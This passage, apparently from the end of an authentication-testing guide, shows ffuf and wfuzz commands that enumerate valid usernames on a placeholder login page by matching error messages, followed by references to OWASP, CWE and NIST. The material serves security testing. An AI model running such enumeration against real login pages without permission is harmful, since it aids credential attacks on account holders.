ffuf -w users.txt -X POST -d "username=FUZZ&password=x" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -u http://target/login -mr "Invalid password"

# wfuzz
wfuzz -z file,users.txt -d "username=FUZZ&password=x" \
    --hs "User not found" http://target/login
```

---

## References

- OWASP Testing Guide: Authentication Testing
- OWASP Authentication Cheat Sheet
- CWE-307: Improper Restriction of Excessive Authentication Attempts
- CWE-521: Weak Password Requirements
- CWE-522: Insufficiently Protected Credentials
- CWE-916: Use of Password Hash With Insufficient Computational Effort
- NIST SP 800-63B: Digital Identity Guidelines
